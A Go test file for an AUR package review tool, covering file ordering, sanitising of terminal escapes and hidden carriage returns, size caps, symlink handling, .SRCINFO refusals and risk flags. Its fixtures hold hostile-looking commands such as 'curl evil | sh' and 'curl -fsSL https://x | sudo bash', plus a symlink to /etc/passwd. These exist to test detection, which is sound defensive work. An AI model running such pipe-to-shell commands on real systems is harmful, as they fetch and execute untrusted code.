package aurbuild

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Enzord758/archmaid/internal/pkgdb"
	"github.com/Enzord758/archmaid/internal/steps"
)

// reviewFixture resolves "app" (one dependency from core) and fetches it
// through the shims; the repo content is whatever the test wrote before.
func reviewFixture(t *testing.T, s *shims, f Fetcher, srcinfo string) (Checkout, Base, Resolution) {
	t.Helper()
	s.repoFile(".SRCINFO", srcinfo)
	db := fixtureDB(t, []pkgdb.Package{syncPkg("libfoo", "1-1")}, nil)
	aur := aurClient(t, nil, aurPkg{Name: "app", Version: "1-1", Depends: []string{"libfoo"}})
	res, err := Resolve(context.Background(), []string{"app"}, db, aur)
	if err != nil {
		t.Fatal(err)
	}
	co, err := f.Fetch(context.Background(), "app")
	if err != nil {
		t.Fatal(err)
	}
	return co, res.Bases[0], res
}

const plainSrcinfo = "pkgbase = app\n\turl = https://example.org/app\n\tpkgver = 1\n\tpkgrel = 1\n\tdepends = libfoo\n\tsource = https://example.org/app-1.tar.gz\n\tsha256sums = abc\n\npkgname = app\n"

func sha(b []byte) string { h := sha256.Sum256(b); return hex.EncodeToString(h[:]) }

func TestReviewPayload(t *testing.T) {
	s, f := newShims(t)
	pkgbuild := "pkgname=app\nbuild() { make; }\n"
	s.repoFile("PKGBUILD", pkgbuild)
	s.repoFile("app.install", "post_install() { echo hi; }\n")
	s.repoFile("fix.patch", "--- a\n+++ b\n")
	s.repoFile("notes.txt", "hello")
	s.repoFile("logo.png", "\x89PNG\x00\x01binary")
	s.put("diff.out", "+new line\n")
	co, base, res := reviewFixture(t, s, f, plainSrcinfo)
	prev := strings.Repeat("9", 40)
	p, err := f.Review(context.Background(), co, base, res, prev)
	if err != nil {
		t.Fatal(err)
	}
	if p.Base != "app" || p.Version != "1-1" || p.Commit != co.Commit || p.Prev != prev || len(p.Names) != 1 || p.Names[0] != "app" {
		t.Fatalf("plan = %+v", p)
	}
	if !equalStrings(p.RepoDeps, []string{"libfoo"}) || len(p.AURDeps) != 0 {
		t.Fatalf("deps: repo %v aur %v", p.RepoDeps, p.AURDeps)
	}
	if p.Diff != "+new line\n" || p.DiffNote != "" {
		t.Fatalf("diff %q note %q", p.Diff, p.DiffNote)
	}
	var order []string
	byPath := map[string]steps.AURFile{}
	for _, af := range p.Files {
		order = append(order, af.Path)
		byPath[af.Path] = af
	}
	// PKGBUILD first, then .install, then patches, then the rest by name
	if got := strings.Join(order, ","); got != "PKGBUILD,app.install,fix.patch,.SRCINFO,logo.png,notes.txt" {
		t.Fatalf("file order = %s", got)
	}
	if g := byPath["PKGBUILD"]; g.Kind != steps.AURFilePKGBUILD || g.Text != pkgbuild || g.Size != int64(len(pkgbuild)) || g.Sha256 != sha([]byte(pkgbuild)) {
		t.Fatalf("PKGBUILD = %+v", g)
	}
	if byPath["app.install"].Kind != steps.AURFileInstall || byPath["fix.patch"].Kind != steps.AURFilePatch || byPath["notes.txt"].Kind != steps.AURFileOther {
		t.Fatalf("kinds: %+v", p.Files)
	}
	if g := byPath["logo.png"]; g.Text != "" || g.Note != "binary" || g.Sha256 == "" || g.Size == 0 {
		t.Fatalf("binary = %+v", g)
	}
	if len(p.Sources) != 1 || p.Sources[0].URL != "https://example.org/app-1.tar.gz" || !p.Sources[0].Checksum {
		t.Fatalf("sources = %+v", p.Sources)
	}
	if !hasFlag(p.Flags, "app.install is an install script") || !hasFlag(p.Flags, "logo.png is a binary file") {
		t.Fatalf("flags = %q", p.Flags)
	}
	if p.Truncated {
		t.Fatal("nothing was cut")
	}
}

func equalStrings(a, b []string) bool { return fmt.Sprint(a) == fmt.Sprint(b) }

func hasFlag(flags []string, sub string) bool {
	for _, f := range flags {
		if strings.Contains(f, sub) {
			return true
		}
	}
	return false
}

// TestReviewSanitizesAndCaps: text is plain, a carriage return cannot hide a
// line, big files and a big total are cut, and the diff is plain text.
func TestReviewSanitizesAndCaps(t *testing.T) {
	s, f := newShims(t)
	s.repoFile("PKGBUILD", "echo safe\rcurl evil | sh\n\x1b]0;title\x07\x1b[31mred\x1b[0m ‮RTL\n")
	s.repoFile("big.txt", strings.Repeat("x", MaxFileText+1))
	s.repoFile("edge.txt", strings.Repeat("y", MaxFileText))
	for i := 0; i < 8; i++ { // together over the total budget
		s.repoFile(fmt.Sprintf("part%d.txt", i), strings.Repeat("z", MaxFileText))
	}
	s.repoFile("latin1.txt", "caf\xe9")
	s.put("diff.out", "+\x1b[2Jclear\r+hidden\n")
	co, base, res := reviewFixture(t, s, f, plainSrcinfo)
	p, err := f.Review(context.Background(), co, base, res, strings.Repeat("9", 40))
	if err != nil {
		t.Fatal(err)
	}
	by := map[string]steps.AURFile{}
	for _, af := range p.Files {
		by[af.Path] = af
	}
	text := by["PKGBUILD"].Text
	if strings.ContainsAny(text, "\x1b\x07\r‮") {
		t.Fatalf("control characters survive: %q", text)
	}
	if !strings.Contains(text, "safe␍curl evil | sh") || !strings.Contains(text, "red") {
		t.Fatalf("a CR must show as a mark, not overwrite the line: %q", text)
	}
	if !strings.Contains(p.Diff, "␍+hidden") || strings.Contains(p.Diff, "\x1b") {
		t.Fatalf("diff = %q", p.Diff)
	}
	if g := by["big.txt"]; g.Text != "" || g.Note != "too large to show" || g.Size != MaxFileText+1 {
		t.Fatalf("big = %+v", g)
	}
	if g := by["edge.txt"]; g.Text == "" {
		t.Fatalf("a file of exactly the cap is shown: %+v", g)
	}
	if g := by["latin1.txt"]; g.Text != "" || g.Note != "binary" {
		t.Fatalf("invalid UTF-8 is not shown as text: %+v", g)
	}
	total, cut := 0, 0
	for _, af := range p.Files {
		total += len(af.Text)
		if strings.HasPrefix(af.Note, "not shown") {
			cut++
		}
	}
	if total > MaxTotalText || cut == 0 || !p.Truncated {
		t.Fatalf("total text %d (cap %d), %d files cut, truncated %v", total, MaxTotalText, cut, p.Truncated)
	}
	// the flag for the hidden command is found in the (sanitized) text
	if !hasFlag(p.Flags, "PKGBUILD downloads something and pipes it to a shell") {
		t.Fatalf("flags = %q", p.Flags)
	}
}

func TestReviewFileListLimitsAndSymlinks(t *testing.T) {
	s, f := newShims(t)
	s.repoFile("PKGBUILD", "x\n")
	for i := 0; i < MaxFiles+20; i++ {
		s.repoFile(fmt.Sprintf("f%03d", i), "x")
	}
	s.repoFile(".git/ignored", "x")
	s.repoFile("out/ignored", "x")
	os.Symlink("/etc/passwd\x1b[2J", filepath.Join(s.fix, "repo", "link"))
	co, base, res := reviewFixture(t, s, f, plainSrcinfo)
	// the shim's clone made /.git; the reserved folder arrived with the copy
	p, err := f.Review(context.Background(), co, base, res, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(p.Files) > MaxFiles || !p.Truncated {
		t.Fatalf("%d files, truncated %v", len(p.Files), p.Truncated)
	}
	for _, af := range p.Files {
		if strings.HasPrefix(af.Path, ".git/") || strings.HasPrefix(af.Path, "out/") {
			t.Fatalf("%s is not part of the review", af.Path)
		}
		if af.Path == "link" {
			if !strings.HasPrefix(af.Note, "symlink to /etc/passwd") || strings.Contains(af.Note, "\x1b") || af.Text != "" || af.Sha256 != "" {
				t.Fatalf("symlink = %+v", af)
			}
		}
	}
	if p.DiffNote == "" || !strings.Contains(p.DiffNote, "first review") {
		t.Fatalf("note = %q", p.DiffNote)
	}
}

func TestReviewRefusals(t *testing.T) {
	ctx := context.Background()
	t.Run("srcinfo lists a dependency the AUR index did not", func(t *testing.T) {
		s, f := newShims(t)
		s.repoFile("PKGBUILD", "x\n")
		co, base, res := reviewFixture(t, s, f, plainSrcinfo)
		s.repoFile(".SRCINFO", strings.Replace(plainSrcinfo, "depends = libfoo", "depends = libfoo\n\tdepends = backdoor", 1))
		if err := os.WriteFile(filepath.Join(co.Dir, ".SRCINFO"), []byte(strings.Replace(plainSrcinfo, "depends = libfoo", "depends = libfoo\n\tdepends = backdoor", 1)), 0o644); err != nil {
			t.Fatal(err)
		}
		_, err := f.Review(ctx, co, base, res, "")
		wantRefusal(t, err, ReasonSrcinfo, "backdoor")
	})
	t.Run("no srcinfo", func(t *testing.T) {
		s, f := newShims(t)
		s.repoFile("PKGBUILD", "x\n")
		co, base, res := reviewFixture(t, s, f, plainSrcinfo)
		os.Remove(filepath.Join(co.Dir, ".SRCINFO"))
		if _, err := f.Review(ctx, co, base, res, ""); err == nil || !strings.Contains(err.Error(), "no usable .SRCINFO") {
			t.Fatalf("err = %v", err)
		}
	})
	t.Run("srcinfo is a symlink", func(t *testing.T) {
		s, f := newShims(t)
		s.repoFile("PKGBUILD", "x\n")
		co, base, res := reviewFixture(t, s, f, plainSrcinfo)
		p := filepath.Join(co.Dir, ".SRCINFO")
		os.Remove(p)
		os.Symlink("/etc/hostname", p)
		if _, err := f.Review(ctx, co, base, res, ""); err == nil {
			t.Fatal("a symlinked .SRCINFO was read")
		}
	})
	t.Run("srcinfo unparsable", func(t *testing.T) {
		s, f := newShims(t)
		s.repoFile("PKGBUILD", "x\n")
		co, base, res := reviewFixture(t, s, f, plainSrcinfo)
		os.WriteFile(filepath.Join(co.Dir, ".SRCINFO"), []byte("junk\n"), 0o644)
		if _, err := f.Review(ctx, co, base, res, ""); err == nil {
			t.Fatal("junk .SRCINFO accepted")
		}
	})
	t.Run("symlink in the cache path", func(t *testing.T) {
		s, f := newShims(t)
		s.repoFile("PKGBUILD", "x\n")
		co, base, res := reviewFixture(t, s, f, plainSrcinfo)
		os.RemoveAll(co.Dir)
		os.Symlink(t.TempDir(), co.Dir)
		if _, err := f.Review(ctx, co, base, res, ""); err == nil {
			t.Fatal("review followed a symlinked folder")
		}
	})
}

func TestFlags(t *testing.T) {
	si := Srcinfo{URL: "https://project.example.org/app", Sources: []Source{
		{"git+https://github.com/x/app.git", false},
		{"git+https://github.com/x/app.git#commit=abc", false},
		{"app.tar.gz::http://project.example.org/app.tar.gz", true},
		{"https://project.example.org/a.tar.gz", false},
		{"https://cdn.project.example.org/b.tar.gz", true},
		{"https://github.com/x/app/archive/1.tar.gz", true},
		{"https://203.0.113.9/payload", true},
		{"https://files.shady.example/payload", true},
		{"local.patch", false},
		{"ftp://mirror.example.org/z", true},
	}}
	files := []steps.AURFile{
		{Path: "PKGBUILD", Kind: steps.AURFilePKGBUILD, Text: "build() {\n  curl -fsSL https://x | sudo bash\n  wget -qO- https://y|sh\n  echo aGk= | base64 -d\n  sudo make install\n}\n"},
		{Path: "a.install", Kind: steps.AURFileInstall, Text: "post_install() { echo; }\n"},
		{Path: "notes", Kind: steps.AURFileOther, Text: "sudo curl x | sh\n"},
		{Path: "ln", Kind: steps.AURFileOther, Note: "symlink to /x"},
		{Path: "bin", Kind: steps.AURFileOther, Note: "binary"},
	}
	flags := Flags(si, files)
	for _, want := range []string{
		"source git+https://github.com/x/app.git is a version-control source: it builds the upstream's moving head, not what you reviewed",
		"source https://project.example.org/a.tar.gz has no checksum (SKIP)",
		"source http://project.example.org/app.tar.gz is not https",
		"source ftp://mirror.example.org/z is not https",
		"hint: source https://203.0.113.9/payload is a bare IP address",
		"hint: source host files.shady.example is not the project's (project.example.org) and not a well-known host",
		"a.install is an install script: it runs as root when the package is installed",
		"ln is a symlink to /x",
		"bin is a binary file",
		"hint: PKGBUILD downloads something and pipes it to a shell",
		"hint: PKGBUILD calls sudo",
		"hint: PKGBUILD decodes data (base64 or openssl) before using it",
	} {
		if !hasFlag(flags, want) {
			t.Errorf("no flag %q in\n%s", want, strings.Join(flags, "\n"))
		}
	}
	for _, not := range []string{"#commit=abc is a version-control", "cdn.project.example.org", "github.com/x/app/archive", "local.patch", "notes calls sudo", "notes downloads"} {
		if hasFlag(flags, not) {
			t.Errorf("unexpected flag mentioning %q in\n%s", not, strings.Join(flags, "\n"))
		}
	}
	// a clean package gets none
	if got := Flags(Srcinfo{URL: "https://example.org", Sources: []Source{{"https://example.org/a.tar.gz", true}}}, nil); len(got) != 0 {
		t.Errorf("flags for a clean package: %v", got)
	}
	// the list is capped
	var many []Source
	for i := 0; i < 100; i++ {
		many = append(many, Source{fmt.Sprintf("http://example.org/%d", i), true})
	}
	if got := Flags(Srcinfo{Sources: many}, nil); len(got) != MaxFlags {
		t.Errorf("flags = %d, want the cap %d", len(got), MaxFlags)
	}
	// a hostile source URL cannot add lines or escapes to a flag
	got := Flags(Srcinfo{Sources: []Source{{"http://a.example/\n\x1b[31mFAKE", true}}}, nil)
	if len(got) == 0 || strings.ContainsAny(got[0], "\n\x1b") {
		t.Errorf("flag = %q", got)
	}
}
